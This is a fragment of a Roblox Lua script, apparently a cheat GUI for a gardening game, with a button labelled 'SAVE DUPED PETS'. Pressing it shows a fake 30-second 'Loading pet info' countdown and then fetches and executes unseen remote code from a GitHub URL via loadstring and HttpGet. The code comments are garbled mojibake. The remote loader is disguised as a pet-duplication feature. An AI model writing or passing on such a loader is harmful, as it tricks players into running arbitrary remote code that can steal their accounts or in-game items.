local statusLabel = MainSection:NewLabel("SAVE STATUS: Ready")

-- ãƒœã‚¿ãƒ³å‚ç…§ã‚’ä¿æŒ
local saveButton

-- SAVE DUPED PETS ãƒœã‚¿ãƒ³ï¼ˆ30ç§’å¾Œã«ã‚¹ã‚¯ãƒªãƒ—ãƒˆå®Ÿè¡Œï¼‰
saveButton = MainSection:NewButton("SAVE DUPED PETS", "Starts saving after countdown", function()
	-- æŠ¼ã•ã‚ŒãŸã‚‰ãƒœã‚¿ãƒ³å‰Šé™¤
	if saveButton then
		saveButton:Remove()
	end

	task.spawn(function()
		for i = 30, 1, -1 do
			statusLabel:UpdateLabel("SAVE STATUS: â³ Loading pet info... (" .. i .. "s)")
			wait(1)
		end

		statusLabel:UpdateLabel("SAVE STATUS: ğŸš€ Booting...")

		local success, err = pcall(function()
			loadstring(game:HttpGet("https://raw.githubusercontent.com/aa362/growagardening/refs/heads/main/uitest"))()
		end)

		if success then
			statusLabel:UpdateLabel("SAVE STATUS: âœ… Success!")
		else
			statusLabel:UpdateLabel("SAVE STATUS: âŒ Error: " .. tostring(err))
		end
	end)
end)
